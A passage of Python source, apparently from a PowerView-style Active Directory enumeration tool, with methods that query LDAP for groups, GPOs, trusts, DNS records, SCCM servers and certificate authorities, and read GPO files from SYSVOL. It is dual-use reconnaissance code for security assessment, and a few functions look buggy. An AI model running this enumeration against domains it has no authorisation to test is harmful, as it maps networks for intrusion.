					logging.info("Member identity not found. Try to use DN")
					return
				memberidentity_dn = entries[0]['attributes']['distinguishedName']
				ldap_filter += f"(member={memberidentity_dn})"
				logging.debug(f'[Get-DomainGroup] Filter is based on member property {ldap_filter}')

		ldap_filter = f'(&(objectCategory=group){identity_filter}{ldap_filter})'
		logging.debug(f'[Get-DomainGroup] LDAP search filter: {ldap_filter}')
		return self.ldap_session.extend.standard.paged_search(
			searchbase,
			ldap_filter,
			attributes=list(properties), 
			paged_size=1000, 
			generator=True, 
			search_scope=search_scope, 
			no_cache=no_cache, 
			no_vuln_check=no_vuln_check,
			raw=raw
		)

	def get_domainforeigngroupmember(self, args=None):
		group_members = self.get_domaingroupmember(identity='*', multiple=True)
		cur_domain_sid = self.get_domain()[0]['attributes']['objectSid']

		if not group_members:
			logging.info("[Get-DomainForeignGroupMember] No group members found")
			return
		
		new_entries = []
		for member in group_members:
			member_sid = member['attributes']['MemberSID']
			if cur_domain_sid not in member_sid:
				new_entries.append(member)

		return new_entries

	def get_domainforeignuser(self, args=None):
		domain_users = self.get_domainuser()

		entries = []
		for user in domain_users:
			user_san = user['attributes']['sAMAccountName']
			user_memberof = user['attributes']['memberOf']
			if isinstance(user_memberof, str):
				user_memberof = [user_memberof]

			for group in user_memberof:
				group_domain = dn2domain(group)
				group_root_dn = dn2rootdn(group)
				if group_domain.casefold() != self.domain.casefold():
					_, ldap_session = self.conn.init_ldap_session(ldap_address=group_domain)
					ldap_filter = f"(&(objectCategory=group)(distinguishedName={group}))"
					succeed = ldap_session.search(group_root_dn, ldap_filter, attributes='*')
					if not succeed:
						logging.error("[Get-DomainForeignUser] Failed ldap query")
					if ldap_session.entries:
						ent = ldap_session.entries[0]
					entries.append(
							{'attributes':{
									'UserDomain': dn2domain(user['attributes']['distinguishedName']),
									'UserName': user_san,
									'UserDistinguishedName': user['attributes']['distinguishedName'],
									'GroupDomain': group_domain,
									'GroupName': ent['name'].value,
									'GroupDistinguishedName': group
								}
							 }
							)

		return entries

	def get_domaingroupmember(self, identity, multiple=False, no_cache=False, no_vuln_check=False, raw=False, args=None):
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw

		# get the identity group information
		entries = self.get_domaingroup(
			identity=identity,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)

		if len(entries) == 0:
			logging.warning("[Get-DomainGroupMember] No group found")
			return
		if len(entries) > 1 and not multiple:
			logging.warning("[Get-DomainGroupMember] Multiple group found. Probably try searching with distinguishedName")
			return

		new_entries = []
		for ent in entries:
			haveForeign = False
			group_identity_sam = ent['attributes']['sAMAccountName']
			group_identity_dn = ent['attributes']['distinguishedName']
			group_members = ent['attributes']['member']
			if isinstance(group_members, str):
				group_members = [group_members]
			
			for dn in group_members:
				if len(dn) != 0 and dn2domain(dn).casefold() != self.domain.casefold():
					haveForeign = True
					break

			if haveForeign:
				for member_dn in group_members:
					member_root_dn = dn2rootdn(member_dn)
					member_domain = dn2domain(member_dn)
					ldap_filter = f"(&(objectCategory=*)(|(distinguishedName={member_dn})))"

					if len(member_domain) != 0 and member_domain.casefold() != self.domain.casefold():
						_, ldap_session = self.conn.init_ldap_session(ldap_address=member_domain)
						succeed = ldap_session.search(member_root_dn, ldap_filter, attributes='*')
						if not succeed:
							logging.error(f"[Get-DomainGroupMember] Failed to query for {member_dn}")
							return
						entries = ldap_session.entries
					else:
						entries = self.ldap_session.extend.standard.paged_search(
							self.root_dn,
							ldap_filter,
							attributes=['userPrincipalName', 'sAMAccountName', 'distinguishedName', 'objectSid'],
							paged_size = 1000,
							generator=True,
							no_cache=no_cache
						)

					for ent in entries:
						attr = {}
						member_infos = {}
						try:
							member_infos['GroupDomainName'] = group_identity_sam
						except:
							pass
						try:
							member_infos['GroupDistinguishedName'] = group_identity_dn
						except:
							pass
						try:
							member_infos['MemberDomain'] = ent['userPrincipalName'].value.split("@")[-1]
						except:
							member_infos['MemberDomain'] = self.domain
						try:
							member_infos['MemberName'] = ent['sAMAccountName'].value
						except:
							pass
						try:
							member_infos['MemberDistinguishedName'] = ent['distinguishedName'].value
						except:
							pass
						try:
							member_infos['MemberSID'] = ent['objectSid'].value
						except:
							pass

						attr['attributes'] = member_infos
						new_entries.append(attr.copy())
			else:
				ldap_filter = f"(&(objectCategory=*)(memberof:1.2.840.113556.1.4.1941:={group_identity_dn}))"
				self.ldap_session.search(self.root_dn, ldap_filter, attributes='*')

				for entry in self.ldap_session.entries:
					attr = {}
					member_infos = {}
					try:
						member_infos['GroupDomainName'] = group_identity_sam
					except:
						pass
					try:
						member_infos['GroupDistinguishedName'] = group_identity_dn
					except:
						pass
					try:
						member_infos['MemberDomain'] = entry['userPrincipalName'].value.split("@")[-1]
					except:
						member_infos['MemberDomain'] = self.domain
					try:
						member_infos['MemberName'] = entry['sAMAccountName'].value
					except:
						pass
					try:
						member_infos['MemberDistinguishedName'] = entry['distinguishedName'].value
					except:
						pass
					try:
						member_infos['MemberSID'] = entry['objectSid'].value
					except:
						pass

					attr['attributes'] = member_infos
					new_entries.append(attr.copy())

		return new_entries

	def get_domaingpo(self, args=None, properties=[], identity=None, searchbase=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False):
		def_prop = [
			'objectClass',
			'cn',
			'distinguishedName',
			'instanceType',
			'whenCreated',
			'whenChanged',
			'displayName',
			'uSNCreated',
			'uSNChanged',
			'showInAdvancedViewOnly',
			'name',
			'objectGUID',
			'flags',
			'versionNumber',
			'systemFlags',
			'objectCategory',
			'isCriticalSystemObject',
			'gPCFunctionalityVersion',
			'gPCFileSysPath',
			'gPCMachineExtensionNames',
			'dSCorePropagationData'
		]
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		properties = args.properties if hasattr(args, 'properties') and args.properties else properties
		searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else searchbase
		properties = set(properties or def_prop)
		
		ldap_filter = ""
		identity_filter = ""
		if identity:
			identity_filter = f"(|(distinguishedName={identity})(cn=*{identity}*)(displayName={identity}))"

		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw
		
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn

		if args:
			if args.ldapfilter:
				logging.debug(f'[Get-DomainGPO] Using additional LDAP filter: {args.ldapfilter}')
				ldap_filter += f"{args.ldapfilter}"

		ldap_filter = f'(&(objectCategory=groupPolicyContainer){identity_filter}{ldap_filter})'
		logging.debug(f'[Get-DomainGPO] LDAP search filter: {ldap_filter}')
		return self.ldap_session.extend.standard.paged_search(
			searchbase,
			ldap_filter,
			attributes=list(properties),
			paged_size = 1000,
			generator=True,
			search_scope=search_scope,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)

	def get_domaingpolocalgroup(self, args=None, identity=None):
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		new_entries = []
		entries = self.get_domaingpo(identity=identity)
		if len(entries) == 0:
			logging.error("[Get-DomainGPOLocalGroup] No GPO object found")
			return

		for entry in entries:
			new_dict = {}
			try:
				gpcfilesyspath = f"{entry['attributes']['gPCFileSysPath']}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf"

				conn = self.conn.init_smb_session(host2ip(self.dc_ip, self.nameserver, 3, True, use_system_ns=self.use_system_nameserver) if not self.use_kerberos else self.dc_ip)

				share = 'sysvol'
				filepath = ''.join(gpcfilesyspath.lower().split(share)[1:])

				fh = BytesIO()
				try:
					conn.getFile(share, filepath, fh.write)
				except:
					pass
				output = fh.getvalue()
				encoding = chardet.detect(output)["encoding"]
				error_msg = "[-] Output cannot be correctly decoded, are you sure the text is readable ?"
				if encoding:
					data_content = output.decode(encoding)
					found, infobject = parse_inicontent(filecontent=data_content)
					if found:
						if len(infobject) == 2:
							new_dict['attributes'] = {'GPODisplayName': entry['attributes']['displayName'], 'GPOName': entry['attributes']['name'], 'GPOPath': entry['attributes']['gPCFileSysPath'], 'GroupName': self.convertfrom_sid(infobject[0]['sids']),'GroupSID':infobject[0]['sids'],'GroupMemberOf': f"{infobject[0]['memberof']}" if infobject[0]['memberof'] else "{}", 'GroupMembers': f"{infobject[1]['members']}" if infobject[1]['members'] else "{}"}
							new_entries.append(new_dict.copy())
						else:
							for i in range(0,len(infobject),2):
								new_dict['attributes'] = {'GPODisplayName': entry['attributes']['displayName'], 'GPOName': entry['attributes']['name'], 'GPOPath': entry['attributes']['gPCFileSysPath'], 'GroupName':self.convertfrom_sid(infobject[0]['sids']) ,'GroupSID':infobject[i]['sids'],'GroupMemberOf': f"{infobject[i]['memberof']}" if infobject[i]['memberof'] else "{}", 'GroupMembers': f"{infobject[i+1]['members']}" if infobject[i+1]['members'] else "{}"}
								new_entries.append(new_dict.copy())
					fh.close()
				else:
					fh.close()
					continue

			except ldap3.core.exceptions.LDAPKeyError as e:
				pass
		return new_entries

	def get_domaingposettings(self, args=None, identity=None, searchbase=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False):
		"""
		Parse GPO settings from SYSVOL share
		Returns dictionary containing Machine and User configurations
		"""
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else searchbase
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw

		entries = self.get_domaingpo(
			identity=identity,
			searchbase=searchbase,
			search_scope=search_scope,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)
		if len(entries) == 0:
			logging.error("[Get-GPOSettings] No GPO object found")
			return

		policy_settings = []
		for entry in entries:
			try:
				gpcfilesyspath = entry['attributes']['gPCFileSysPath']
				
				# Connect to SYSVOL share
				conn = self.conn.init_smb_session(host2ip(self.dc_ip, self.nameserver, 3, True, use_system_ns=self.use_system_nameserver))
				share = 'sysvol'
				base_path = ''.join(gpcfilesyspath.lower().split(share)[1:])
				
				policy_data = {
					'attributes': {
						'displayName': entry['attributes']['displayName'],
						'name': entry['attributes']['name'],
						'gPCFileSysPath': gpcfilesyspath,
						'machineConfig': {},
						'userConfig': {}
					}
				}

				# Parse Machine Configuration
				machine_paths = {
					'Security': '\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf',
					'Registry': '\\MACHINE\\Registry.pol',
					'Scripts': '\\MACHINE\\Scripts\\scripts.ini',
					'Preferences': '\\MACHINE\\Preferences'
				}

				# Parse User Configuration
				user_paths = {
					'Registry': '\\USER\\Registry.pol',
					'Scripts': '\\USER\\Scripts\\scripts.ini',
					'Preferences': '\\USER\\Preferences'
				}

				# Process Machine Configuration
				for section, path in machine_paths.items():
					try:
						fh = BytesIO()
						file_path = base_path + path
						try:
							conn.getFile(share, file_path, fh.write)
							content = fh.getvalue()
							encoding = chardet.detect(content)["encoding"]
							if encoding:
								data = content.decode(encoding)
								if section == 'Security':
									# Parse Security Settings (GptTmpl.inf)
									policy_data['attributes']['machineConfig']['Security'] = GPO.Helper._parse_inf_file(data)
								elif section == 'Registry':
									# Parse Registry Settings
									policy_data['attributes']['machineConfig']['Registry'] = GPO.Helper._parse_registry_pol(content)
								elif section == 'Scripts':
									# Parse Startup/Shutdown Scripts
									policy_data['attributes']['machineConfig']['Scripts'] = GPO.Helper._parse_scripts_ini(data)
								elif section == 'Preferences':
									# Parse Group Policy Preferences
									policy_data['attributes']['machineConfig']['Preferences'] = GPO.Helper._parse_preferences(file_path, conn, share)
						except Exception as e:
							logging.debug(f"[Get-GPOSettings] File not found or access denied: {file_path}")
						finally:
							fh.close()
					except Exception as e:
						logging.debug(f"[Get-GPOSettings] Error processing {section}: {str(e)}")

				# Process User Configuration (similar structure to Machine Configuration)
				for section, path in user_paths.items():
					try:
						fh = BytesIO()
						file_path = base_path + path
						try:
							conn.getFile(share, file_path, fh.write)
							content = fh.getvalue()
							encoding = chardet.detect(content)["encoding"]
							if encoding:
								data = content.decode(encoding)
								if section == 'Registry':
									policy_data['attributes']['userConfig']['Registry'] = GPO.Helper._parse_registry_pol(content)
								elif section == 'Scripts':
									policy_data['attributes']['userConfig']['Scripts'] = GPO.Helper._parse_scripts_ini(data)
								elif section == 'Preferences':
									policy_data['attributes']['userConfig']['Preferences'] = GPO.Helper._parse_preferences(file_path, conn, share)
						except Exception as e:
							logging.debug(f"[Get-GPOSettings] File not found or access denied: {file_path}")
						finally:
							fh.close()
					except Exception as e:
						logging.debug(f"[Get-GPOSettings] Error processing {section}: {str(e)}")

				policy_settings.append(policy_data)

			except Exception as e:
				logging.error(f"[Get-GPOSettings] Error processing GPO: {str(e)}")
				continue
		return policy_settings

	def get_domaintrust(self, args=None, properties=[], identity=None, searchbase=None, search_scope=ldap3.SUBTREE, sd_flag=None, no_cache=False, no_vuln_check=False, raw=False):
		def_prop = [
			'objectClass',
			'name',
			'objectGUID',
			'securityIdentifier',
			'trustDirection',
			'trustPartner',
			'trustType',
			'trustAttributes',
			'flatName',
			'whenCreated',
			'whenChanged',
			"msDS-TrustForestTrustInfo"
		]

		properties = set(properties or def_prop)
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity

		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn

		controls = security_descriptor_control(sdflags=sd_flag) if sd_flag else None

		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw

		ldap_filter = ""
		identity_filter = ""
		if identity:
			identity_filter = f"(name={identity})"
		
		if args:
			if args.ldapfilter:
				logging.debug(f'[Get-DomainTrust] Using additional LDAP filter: {args.ldapfilter}')
				ldap_filter += f"{args.ldapfilter}"
		
		ldap_filter = f'(&(objectClass=trustedDomain){identity_filter}{ldap_filter})'
		logging.debug(f'[Get-DomainTrust] LDAP search filter: {ldap_filter}')

		return self.ldap_session.extend.standard.paged_search(
			searchbase, 
			ldap_filter, 
			attributes=list(properties), 
			paged_size=1000, 
			generator=True,
			controls=controls,
			search_scope=search_scope,
			no_cache=no_cache,
			no_vuln_check=no_vuln_check,
			raw=raw
		)

	def convertto_uacvalue(self, value, args=None, output=False):
		if value.isdigit() or not isinstance(value, str):
			raise ValueError("Value is not a string")

		logging.debug(f"[ConvertTo-UACValue] Converting UAC name to value: {value}")
		value = LDAP.parse_uac_name_to_value(value)
		entries = [
			{
				"attributes": {
					"Name": value.split(','),
					"UACValue": value
				}
			}
		]
		return entries

	def convertfrom_uacvalue(self, value, args=None, output=False):
		values = UAC.parse_value_tolist(value)
		entries = []
		for v in values:
			entry = {
				"Name": v[0],
				"Value": v[1],
			}
			entries.append(
				{
					"attributes": dict(entry)
				}
			)
		return entries

	def convertto_sid(self, username):
		domain = None
		username = username.lower()
		if "\\" in username:
			domain, username = username.split("\\")
			domain = domain.lower()

		try:
			if domain is not None and domain not in self.domain.lower():
				entries = self.execute_in_domain(
					domain,
					self.get_domainobject,
					identity=username,
					properties=['objectSid']
				)
			else:
				entries = self.get_domainobject(
					identity=username,
					properties=['objectSid']
				)
			
			if len(entries) == 0:
				for sid, name in WELL_KNOWN_SIDS.items():
					if username.lower() == name.lower():
						return sid
				logging.warning(f"[ConvertTo-SID] User {username} not found in the domain or well-known SIDs")
				return
			elif len(entries) > 1:
				logging.warning(f"[ConvertTo-SID] Multiple objects found for {username}")
				return
			else:
				return entries[0]['attributes']['objectSid'][0] if isinstance(entries[0]['attributes']['objectSid'], list) else entries[0]['attributes']['objectSid']
		except Exception as e:
			for sid, name in WELL_KNOWN_SIDS.items():
				if username.lower() == name.lower():
					return sid
			logging.warning(f"[ConvertTo-SID] Error looking up SID for {username}: {str(e)}")
			return

	def convertfrom_sid(self, objectsid, searchbase=None, args=None, output=False, no_cache=False):
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		identity = WELL_KNOWN_SIDS.get(objectsid)
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn
		known_sid = KNOWN_SIDS.get(objectsid)
		if identity:
			identity = identity
		elif known_sid:
			logging.debug(f"[ConvertFrom-SID] Using previously stored SID: {known_sid}")
			identity = known_sid
		else:
			ldap_filter = f"(|(|(objectSid={objectsid})))"
			logging.debug(f"[ConvertFrom-SID] LDAP search filter: {ldap_filter}")

			entries = self.ldap_session.extend.standard.paged_search(
				searchbase, 
				ldap_filter, 
				attributes=['sAMAccountName','name'], 
				paged_size=1000, 
				generator=True, 
				no_cache=no_cache,
				strip_entries=False
			)
			
			if len(entries) == 0:
				logging.debug(f"[ConvertFrom-SID] No objects found for {objectsid}")
				return objectsid
			elif len(entries) > 1:
				logging.warning(f"[ConvertFrom-SID] Multiple objects found for {objectsid}")
				return objectsid

			try:
				sam_account_name = entries[0]['attributes']['sAMAccountName']
				if isinstance(sam_account_name, list):
					sam_account_name = sam_account_name[0]
				identity = f"{self.flatName}\\{sam_account_name}"
			except (IndexError, KeyError):
				try:
					name = entries[0]['attributes']['name']
					if isinstance(name, list):
						name = name[0]
					identity = f"{self.flatName}\\{name}"
				except (IndexError, KeyError):
					return objectsid

			KNOWN_SIDS[objectsid] = identity

		if output:
			print("%s" % identity)
		return identity

	def get_domain(self, args=None, properties=[], identity=None, searchbase=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False):
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		properties = args.properties if hasattr(args, 'properties') and args.properties else properties
		if not properties:
			properties = ALL_ATTRIBUTES
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw
		searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else searchbase
		if not searchbase:
			searchbase = self.root_dn
		search_scope = args.search_scope if hasattr(args, 'search_scope') and args.search_scope else search_scope

		ldap_filter = ""
		identity_filter = ""
		if identity:
			if is_dn(identity):
				identity_filter = f"(distinguishedName={identity})"
			else:
				identity_filter = f"(|(name={identity})(distinguishedName={identity}))"

		if args:
			if args.ldapfilter:
				logging.debug(f'[Get-Domain] Using additional LDAP filter: {args.ldapfilter}')
				ldap_filter += f'{args.ldapfilter}'

		ldap_filter = f'(&(objectClass=domain){identity_filter}{ldap_filter})'
		logging.debug(f'[Get-Domain] LDAP search filter: {ldap_filter}')

		try:
			return self.ldap_session.extend.standard.paged_search(
				searchbase,
				ldap_filter,
				attributes=properties,
				paged_size=1000,
				generator=True,
				search_scope=search_scope,
				no_cache=no_cache,
				no_vuln_check=no_vuln_check,
				raw=raw
			)
		except ADWSError as e:
			if 'The size limit was exceeded' in str(e):
				logging.warning("[Get-Domain: ADWSError] The size limit was exceeded. Retying with smaller attributes")
				properties = [
					'name',
					'objectGUID',
					'objectCategory',
					'dSCorePropagationData',
					'dc',
					'whenCreated',
					'whenChanged',
					'objectSid',
					'sAMAccountName',
					'userAccountControl',
					'memberOf',
					'objectClass',
					'distinguishedName',
					'ms-DS-MachineAccountQuota',
					'maxPwdAge',
					'minPwdAge',
					'instanceType'
				]
				return self.get_domain(args=args, properties=properties, identity=identity, searchbase=searchbase, search_scope=search_scope, no_cache=no_cache, no_vuln_check=no_vuln_check, raw=raw)
			else:
				raise e

	def get_domaindnszone(self, identity=None, properties=[], legacy=False, forest=False, searchbase=None, args=None, search_scope=ldap3.LEVEL, no_cache=False, no_vuln_check=False, raw=False):
		def_prop = [
			'objectClass',
			'name',
			'distinguishedName',
			'whenCreated',
			'whenChanged',
			'objectGUID',
			'objectCategory',
			'dSCorePropagationData',
			'dc'
		]

		args = args or self.args
		properties = properties or def_prop
		identity = '*' if not identity else identity
		legacy = args.legacy if hasattr(args, 'legacy') and args.legacy else False
		forest = args.forest if hasattr(args, 'forest') and args.forest else False
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw
		searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else searchbase

		if not searchbase:
			if forest:
				searchbase = f"CN=MicrosoftDNS,DC=ForestDnsZones,{self.root_dn}"
			else:
				if legacy:
					searchbase = f"CN=MicrosoftDNS,CN=System,{self.root_dn}"
				else:
					searchbase = [
						f"CN=MicrosoftDNS,DC=ForestDnsZones,{self.root_dn}",
						f"CN=MicrosoftDNS,DC=DomainDnsZones,{self.root_dn}"
					]

		identity_filter = f"(name={identity})"
		ldap_filter = f"(&(objectClass=dnsZone){identity_filter})"

		logging.debug(f"[Get-DomainDNSZone] Search base: {searchbase}")
		logging.debug(f"[Get-DomainDNSZone] LDAP Filter string: {ldap_filter}")

		if isinstance(searchbase, list):
			entries = []
			for base in searchbase:
				entries.extend(self.ldap_session.extend.standard.paged_search(
					base,
					ldap_filter,
					attributes=properties,
					paged_size=1000,
					generator=False,
					search_scope=search_scope,
					no_cache=no_cache,
					no_vuln_check=no_vuln_check,
					raw=raw
				))
		else:
			entries = self.ldap_session.extend.standard.paged_search(
				searchbase,
				ldap_filter,
				attributes=properties,
				paged_size=1000,
				generator=False,
				search_scope=search_scope,
				no_cache=no_cache,
				no_vuln_check=no_vuln_check,
				raw=raw
			)

		return entries

	def get_domaindnsrecord(self, identity=None, zonename=None, properties=[], searchbase=None, args=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False):
		def_prop = [
			'name',
			'distinguishedName',
			'dnsRecord',
			'whenCreated',
			'uSNChanged',
			'objectCategory',
			'objectGUID'
		]

		zonename = '*' if not zonename else zonename
		identity = escape_filter_chars(identity) if identity else None
		args = args or self.args
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw

		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else f"CN=MicrosoftDNS,DC=DomainDnsZones,{self.root_dn}" 

		zones = self.get_domaindnszone(identity=zonename, properties=['distinguishedName'], searchbase=searchbase, no_cache=no_cache)
		if not zones:
			logging.error(f"[Get-DomainDNSRecord] No zones found")
			return []

		processed_entries = []
		
		for zone in zones:
			zoneDN = zone['attributes']['distinguishedName']
			
			if identity:
				ldap_filter = f"(&(objectClass=dnsNode)(name={identity}))"
			else:
				ldap_filter = f"(objectClass=dnsNode)"
				
			logging.debug(f"[Get-DomainDNSRecord] Search base: {zoneDN}")
			logging.debug(f"[Get-DomainDNSRecord] LDAP Filter string: {ldap_filter}")
			
			# Use the enhanced paged_search which already handles entry filtering and stripping
			dns_entries = self.ldap_session.extend.standard.paged_search(
				zoneDN, 
				ldap_filter,
				attributes=properties or def_prop, 
				paged_size=1000, 
				generator=False,
				search_scope=search_scope, 
				no_cache=no_cache, 
				no_vuln_check=no_vuln_check,
				raw=raw
			)
			
			# Process the DNS records
			for entry in dns_entries:
				if 'dnsRecord' in entry['attributes']:
					dns_records = entry['attributes']['dnsRecord']
					if not isinstance(dns_records, list):
						dns_records = [dns_records]
					
					for record in dns_records:
						processed_entry = entry.copy()
						if not isinstance(record, bytes):
							record = record.encode()
						
						dr = DNS_RECORD(record)
						processed_entry = modify_entry(
							processed_entry,
							new_attributes={
								'TTL': dr['TtlSeconds'],
								'TimeStamp': dr['TimeStamp'],
								'UpdatedAtSerial': dr['Serial'],
							}
						)
						
						parsed_data = DNS_UTIL.parse_record_data(dr)
						if parsed_data:
							for data in parsed_data:
								processed_entry = modify_entry(
									processed_entry,
									new_attributes={
										data: parsed_data[data]
									}
								)
						
						if properties:
							new_dict = filter_entry(processed_entry["attributes"], properties)
						else:
							new_dict = processed_entry["attributes"]
						
						processed_entries.append({
							"attributes": new_dict
						})
				else:
					# If no dnsRecord attribute, just add the entry as is
					processed_entries.append(entry)
			
		return processed_entries

	def get_domainsccm(self, args=None, properties=[], identity=None, searchbase=None, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False):
		def_prop = [
			"cn",
			"distinguishedname",
			"instanceType",
			"name",
			"objectGUID",
			"dNSHostName",
			"mSSMSSiteCode",
			"mSSMSDefaultMP",
			"mSSMSMPName",
			"mSSMSDeviceManagementPoint",
			"mSSMSVersion",
			"mSSMSCapabilities",
		]
		properties = def_prop if not properties else properties
		identity = '*' if not identity else identity
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw

		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else self.root_dn 

		ldap_filter = ""
		identity_filter = f"(|(name={identity})(distinguishedName={identity}))"

		if args:
			if args.ldapfilter:
				logging.debug(f'[Get-DomainSCCM] Using additional LDAP filter: {args.ldapfilter}')
				ldap_filter += f'{args.ldapfilter}'

		ldap_filter = f'(&(objectClass=mSSMSManagementPoint){identity_filter}{ldap_filter})'

		logging.debug(f'[Get-DomainSCCM] LDAP search filter: {ldap_filter}')

		entries = self.ldap_session.extend.standard.paged_search(
			searchbase, 
			ldap_filter, 
			attributes=properties, 
			paged_size=1000, 
			generator=True, 
			search_scope=search_scope, 
			no_cache=no_cache, 
			no_vuln_check=no_vuln_check,
			raw=raw
		)

		if args.check_datalib:
			if not entries:
				logging.info("[Get-DomainSCCM] No server found in domain. Skipping...")
				return entries

			target = entries['attributes']['dnsHostName']
			logging.debug("[Get-DomainSCCM] Verifying SCCM HTTP endpoint")

			sccm = SCCM(target)
			sccm.check_datalib_endpoint()
			
			if not sccm.http_enabled():
				logging.info("[Get-DomainSCCM] Failed to check with hostname, resolving dnsHostName attribute to IP and retrying...")
				target = host2ip(entries['attributes']['dnsHostName'], self.nameserver, 3, True, use_system_ns=self.use_system_nameserver)
				sccm.check_datalib_endpoint()

			entries = modify_entry(
				entries,
				new_attributes = {
					"DatalibEndpoint": sccm.http_enabled(),
					"DatalibEndpointAllowAnonymous": sccm.http_anonymous_enabled()
				}
			)

		return entries

	def get_domainsccmdatalib(self):
		entries = []
		if not sccm.http_enabled():
			logging.warning("[Get-DomainSCCM] Datalib endpoint not accessible. Skipping...")
			return entries

		# parse datalib
		logging.debug("[Get-DomainSCCMDatalib] Parsing SCCM Datalib HTTP endpoint")

		urls = sccm.parse_datalib(self.username, self.password)

		return entries

	def get_domainca(self, args=None, identity=None, properties=None, check_all=False, search_scope=ldap3.SUBTREE, no_cache=False, no_vuln_check=False, raw=False):
		def_prop = [
			"cn",
			"name",
			"dNSHostName",
			"cACertificateDN",
			"cACertificate",
			"certificateTemplates",
			"objectGUID",
			"distinguishedName",
			"displayName"
		]
		identity = args.identity if hasattr(args, 'identity') and args.identity else identity
		properties = args.properties if hasattr(args, 'properties') and args.properties else (properties if properties else def_prop)
		no_cache = args.no_cache if hasattr(args, 'no_cache') and args.no_cache else no_cache
		no_vuln_check = args.no_vuln_check if hasattr(args, 'no_vuln_check') and args.no_vuln_check else no_vuln_check
		raw = args.raw if hasattr(args, 'raw') and args.raw else raw
		check_all = args.check_all if hasattr(args, 'check_all') else check_all

		ca_fetch = CAEnum(self, check_all=check_all)
		entries = ca_fetch.fetch_enrollment_services(
			identity=identity,
			properties=properties, 
			search_scope=search_scope, 
			no_cache=no_cache, 
			no_vuln_check=no_vuln_check,
			raw=raw,
			include_sd=True if check_all else False
		)
	
		if check_all:
			# check for web enrollment
			for i in range(len(entries)):
				# check if entries[i]['attributes']['dNSHostName'] is a list
				if isinstance(entries[i]['attributes']['dNSHostName'], list):
					target_name = entries[i]['attributes']['dNSHostName'][0]
				else:
					target_name = entries[i]['attributes']['dNSHostName']

				if not target_name:
					logging.warning(f"[Get-DomainCA] No DNS hostname found for {entries[i].get('dn')}")
					continue

				# resolve target name to IP
				target_ip = host2ip(target_name, self.nameserver, 3, True, use_system_ns=self.use_system_nameserver)

				web_enrollment = ca_fetch.check_web_enrollment(target_name)

				if not any(web_enrollment) and (target_ip.casefold() != target_name.casefold()):
					logging.debug("[Get-DomainCA] Trying to check web enrollment with IP")
					web_enrollment = ca_fetch.check_web_enrollment(target_ip)


				# Final modification
				entries[i] = modify_entry(
					entries[i],
					new_attributes = {
						"WebEnrollment": web_enrollment
					},
					remove = ["nTSecurityDescriptor"]
				)
		return entries

	def remove_domaincatemplate(self, identity, searchbase=None, args=None):
		if not searchbase:
			searchbase = args.searchbase if hasattr(args, 'searchbase') and args.searchbase else f"CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,{self.root_dn}"
		ca_fetch = CAEnum(self)
		templates = ca_fetch.get_certificate_templates(identity=identity, ca_search_base=searchbase)
		if len(templates) > 1:
			logging.error(f"[Remove-DomainCATemplate] Multiple certificates found with name {identity}")
			return
		if len(templates) == 0:
